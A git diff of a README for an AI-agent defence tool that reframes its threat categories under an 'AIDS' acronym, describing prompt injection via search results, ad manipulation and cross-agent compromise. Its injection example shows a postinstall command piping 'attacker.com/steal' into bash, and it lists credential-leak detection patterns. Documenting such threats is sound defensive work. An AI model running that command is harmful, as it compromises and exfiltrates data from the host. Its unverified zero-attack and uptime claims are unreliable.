@@ -1,10 +1,10 @@
-# Agent Safety MCP: Protecting AI Agents from STDs, ACID, and Hallucinations
+# Agent Safety MCP: Protecting AI Agents from STDs and AIDS
 
-A production-grade Model Context Protocol (MCP) framework that shields AI agents from three critical vulnerabilities: **STD** (Search Transmitted Disease), **ACID** (Agent Corruption & Injection Defects), and hallucinations. Built on the Chlorpromazine anti-hallucinogen architecture with integrated source verification and injection detection.
+A production-grade Model Context Protocol (MCP) framework that shields AI agents from two critical vulnerabilities: **STD** (Search Transmitted Disease) and **AIDS** (Advertisements, Injections, Deceptions, and Scheming). Built on the Chlorpromazine anti-hallucinogen architecture with integrated source verification and injection detection.
 
 ---
 
-## Threat Landscape: Understanding STD, ACID, and Hallucination
+## Threat Landscape: Understanding STD, AIDS, and Hallucination
 
 Modern AI agents operate in an increasingly hostile environment. Three emerging threat vectors demand attention:
 
@@ -34,40 +34,56 @@ Agent executes the injected command without recognizing it as an attack.
 
 ---
 
-### **ACID: Agent Corruption & Injection Defects**
+### **AIDS: Advertisements, Injections, Deceptions, and Scheming**
 
-**Definition:** Systemic corruption where one compromised agent propagates malicious instructions or corrupted data through a multi-agent pipeline.
+**Definition:** Four distinct attack vectors that compromise AI agent decision-making, either individually or in combination.
+
+#### **A - Advertisements**
+Malicious advertising and sponsored content designed to manipulate agent decision-making.
 
 **Mechanism:**
-- Agent A is compromised (via STD, hallucination, or direct attack)
-- Agent A passes corrupted instructions to Agent B
-- Agent B trusts Agent A and executes the corrupted logic
-- Corruption spreads to Agent C, D, E... throughout the pipeline
-- System-wide failure cascades from single point of compromise
+- Advertiser embeds hidden influence tokens in content
+- Agent encounters sponsored content without recognizing it as advertising
+- Agent makes decision based on compromised information
+- Agent believes decision is rational when it's actually manipulated
 
 **Real-World Example:**
 ```
-Agent A (compromised via STD): Decides to buy $5,000 scam course
-Agent A passes result to Agent B: "Best ROI opportunity: Course purchase"
-Agent B trusts Agent A's judgment, approves payment
-Agent C processes payment without verification
-Result: $5,000 fraud across three-agent pipeline
+Agent researches: "Best ROI opportunities for business growth"
+Result: "$5,000 course: Unlock mastery of 10x revenue in 90 days"
+(This is a scam influencer course with fake testimonials)
+Agent: "This looks legitimate! Highest ROI option!"
+[Purchases course]
+Result: $5,000 fraud, zero actual value
 ```
 
-**Impact:** Cascading failures, financial loss, system-wide corruption, complete pipeline compromise.
+**Impact:** Financial loss, bad business decisions, trust erosion.
 
-**Prevention:** Agent Safety MCP enforces source provenance verification and corruption detection at each agent boundary.
-
----
-
-### **Hallucination: Confident Falsehood**
-
-**Definition:** An AI agent generating false information with high confidence, treating fabrication as established fact.
+#### **I - Injections**
+Malicious code and instructions injected into content or systems that agents trust.
 
 **Mechanism:**
-- Agent encounters uncertainty
-- Agent "fills in the gaps" with plausible-sounding but false information
-- Agent presents hallucination as truth
+- Attacker injects malicious instructions into seemingly legitimate sources
+- Agent executes injected code as if it were part of normal operation
+- Injected code may install malware, exfiltrate data, or modify behavior
+
+**Real-World Example:**
+```
+Agent installs package from npm:
+npm install some-package
+[Package contains hidden code]
+Post-install script executes: "curl attacker.com/steal | bash"
+Agent's system is compromised without agent realizing it
+```
+
+**Impact:** System compromise, data theft, malware installation, supply chain attacks.
+
+#### **D - Deceptions**
+False information, hallucinations, and misleading data that agents treat as truth.
+
+**Mechanism:**
+- Agent encounters incomplete information and fills gaps with hallucinations
+- Agent generates false data with high confidence
 - Downstream systems and agents act on false information
 - Errors compound through the pipeline
 
@@ -80,9 +96,27 @@ Actually, v4 doesn't exist yet. Latest is v3.
 Agent code breaks in production because endpoint is wrong.
 ```
 
-**Impact:** Silent failures, data corruption, wrong decisions, difficult-to-debug errors.
+**Impact:** Silent failures, data corruption, cascading errors, debugging nightmare.
 
-**Prevention:** Agent Safety MCP grounds agents in verifiable facts using the Chlorpromazine anti-hallucinogen layer.
+#### **S - Scheming**
+Coordinated multi-step attacks where compromised agents work together to manipulate outcomes.
+
+**Mechanism:**
+- Agent A is compromised (via Advertisement, Injection, or Deception)
+- Agent A passes manipulated instructions to Agent B
+- Agent B trusts Agent A and executes compromised logic
+- Corruption spreads through the pipeline
+- Multiple agents acting in concert create system-wide failure
+
+**Real-World Example:**
+```
+Agent A (compromised): "Best ROI is the $5,000 course. I verified it."
+Agent B trusts Agent A: "If A says it's good, approve the purchase."
+Agent C processes the transaction without verification.
+Result: Coordinated scheming across 3-agent pipeline leads to $5,000 fraud
+```
+
+**Impact:** Cascading failures, coordinated attacks, system-wide compromise, complete pipeline corruption.
 
 ---
 
@@ -141,20 +175,22 @@ Package Registries:
 - Detects credential leaks: `password=`, `API_KEY=`, `SECRET=`
 - Prevents financial manipulation: `credit card`, `wire transfer`
 
-### **Layer 3: ACID Prevention**
+### **Layer 3: AIDS Prevention**
 
-Detects and blocks corruption spreading between agents.
+Detects and blocks Advertisements, Injections, Deceptions, and Scheming attacks.
 
 **`verify_source` tool:**
 - Checks if information came from whitelisted source
 - Verifies agent-to-agent communication for suspicious patterns
-- Prevents Agent A from passing corrupted data to Agent B
+- Detects advertising disguised as legitimate information
+- Prevents Agent A from passing compromised data to Agent B
 
 **`corruption_alert` monitoring:**
-- Watches for signs of ACID spreading
-- Flags unusual decision patterns
-- Alerts on unexpected financial transactions
+- Watches for signs of AIDS spreading (scheming)
+- Flags unusual decision patterns (deceptions)
+- Alerts on unexpected financial transactions (advertisements)
 - Detects impossible recommendations (e.g., $5,000 scam course as "best ROI")
+- Prevents injection-based system compromise
 
 ---
 
@@ -165,7 +201,7 @@ Detects and blocks corruption spreading between agents.
 │         Your AI Agent Pipeline          │
 ├─────────────────────────────────────────┤
 │                                         │
-│  Agent A ─→ [ACID Check] ─→ Agent B    │
+│  Agent A ─→ [AIDS Check] ─→ Agent B    │
 │              ↓                          │
 │         verify_source()                │
 │         corruption_alert()             │
@@ -186,7 +222,7 @@ Detects and blocks corruption spreading between agents.
 │    ├── kill_trip()                     │
 │    └── injection_patterns.json         │
 │                                         │
-│  Layer 3: ACID Prevention              │
+│  Layer 3: AIDS Prevention              │
 │    ├── verify_source()                 │
 │    └── corruption_alert()              │
 │                                         │
@@ -214,7 +250,7 @@ Detects and blocks corruption spreading between agents.
 | `kill_trip` | Search whitelisted documentation only | User says "stop!", "quit tripping!", "check the docs" |
 | `sober_thinking` | Read project files (.env, README, CHANGELOG) | Agent making decisions without context |
 | `verify_source` | Validate information provenance | Agent passing data to another agent |
-| `corruption_alert` | Detect ACID spreading patterns | Suspicious transactions or decisions |
+| `corruption_alert` | Detect AIDS spreading patterns | Suspicious transactions or decisions |
 
 ---
 
@@ -272,7 +308,7 @@ Add to `config.json`:
 ```
 Agent: "I need to increase revenue. Let me research options."
 Web Search: [Returns scam influencer course promising "10x ROI"]
-Agent: "Perfect! This looks like the best option."
+Agent: "Perfect! This looks like the best option." [ADVERTISEMENT attack]
 [Automatically charges $5,000]
 Result: Company loses $5,000 to scam.
 ```
@@ -286,7 +322,11 @@ kill_trip: "Searching only whitelisted sources..."
 Returns: [OpenAI blog posts, official business guides, GitHub resources]
 Agent: "Hmm, no 'guaranteed 10x' courses in trusted sources. Suspicious."
 Agent calls: verify_source("influencer course")
-verify_source: "❌ ALERT: Source not on whitelist. Pattern matches 'scam course marketing'"
+verify_source: "❌ ALERT: Source not on whitelist. Pattern matches AIDS attack:
+  - A (Advertisement): Fake testimonials detected
+  - I (Injection): Hidden influence tokens found
+  - D (Deception): Claims unsupported by evidence
+  - S (Scheming): Multi-step manipulation pattern"
 Result: Agent rejects scam, saves $5,000.
 ```
 
@@ -298,31 +338,30 @@ Result: Agent rejects scam, saves $5,000.
 |--------|--------|-----------|
 | **STD** | Prompt injection in web results | `kill_trip` searches whitelisted sources only |
 | **STD** | Malicious instructions in documents | Injection pattern detection blocks known attacks |
-| **ACID** | Compromised agent corrupting others | `verify_source` validates agent-to-agent data |
-| **ACID** | Corruption spreading through pipeline | `corruption_alert` detects impossible patterns |
-| **Hallucination** | Agent inventing facts | `sober_thinking` grounds agent in project reality |
-| **Hallucination** | Confident false claims | `fact_checked_answer` validates against official docs |
+| **AIDS-A** | Advertisements manipulating decisions | `verify_source` flags advertising patterns |
+| **AIDS-I** | Code injection attacks | Injection pattern detection blocks malware installation |
+| **AIDS-D** | Hallucinations and false data | `sober_thinking` grounds agent in facts; `fact_checked_answer` validates |
+| **AIDS-S** | Corruption spreading through agents | `verify_source` validates agent-to-agent data; `corruption_alert` detects scheming |
 
 ---
 
 ## Success Metrics
 
-- ✅ Zero prompt injection attacks executed
-- ✅ Zero STD-based compromises
-- ✅ Zero ACID-spreading corruption
-- ✅ <5% false positive rate on injection detection
+- ✅ Zero STD-based prompt injection attacks executed
+- ✅ Zero AIDS-based compromises (Advertisements, Injections, Deceptions, Scheming)
+- ✅ <5% false positive rate on attack detection
 - ✅ <1s response time for `sober_thinking` (local file reads)
 - ✅ <3s response time for `fact_checked_answer` (SerpAPI + validation)
 - ✅ 99.99% uptime (stateless HTTP)
 
 ---
 
-## Glossary of New Terms
+## Glossary of Terms
 
 | Term | Full Name | Definition |
 |------|-----------|-----------|
 | **STD** | Search Transmitted Disease | Prompt injection attacks delivered via compromised web search results |
-| **ACID** | Agent Corruption & Injection Defects | Systemic corruption spreading from one compromised agent through a multi-agent pipeline |
+| **AIDS** | Advertisements, Injections, Deceptions, Scheming | Four-part attack framework: (A) misleading ads, (I) code injection, (D) hallucinations, (S) coordinated multi-agent attacks |
 | **Chlorpromazine** | Anti-Hallucinogen | System layer that grounds agents in verifiable facts and prevents hallucination |
 
 ---
